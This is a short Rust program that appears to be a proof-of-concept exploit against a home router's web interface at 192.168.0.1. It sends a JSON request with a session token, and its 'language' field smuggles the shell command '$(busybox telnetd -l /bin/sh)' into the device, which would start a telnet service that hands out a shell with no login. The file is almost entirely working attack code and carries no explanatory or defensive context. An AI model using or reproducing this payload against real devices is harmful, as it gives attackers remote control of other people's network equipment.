use std::collections::HashMap;
use clap::Parser;


#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Filename
    #[arg(required = true)]
    token: String,
}


#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {

	let args = Args::parse();
	let token = args.token;

	let mut payload: HashMap<String, String> = HashMap::new();
	payload.insert(
		"token".to_string(),
		String::from(&token)
	);
	payload.insert(
		"module".to_string(),
		"webServer".to_string()
	);
    payload.insert(
		"action".to_string(),
		"1".to_string()
	);
	payload.insert(
		"language".to_string(),
		"$(busybox telnetd -l /bin/sh)".to_string()
	);
	println!("{token:#?}");

	let client = reqwest::Client::new();

	let resp = client.post("http://192.168.0.1")
		.json(&payload)
		.send()
		.await?;

    println!("{resp:#?}");
    Ok(())
}

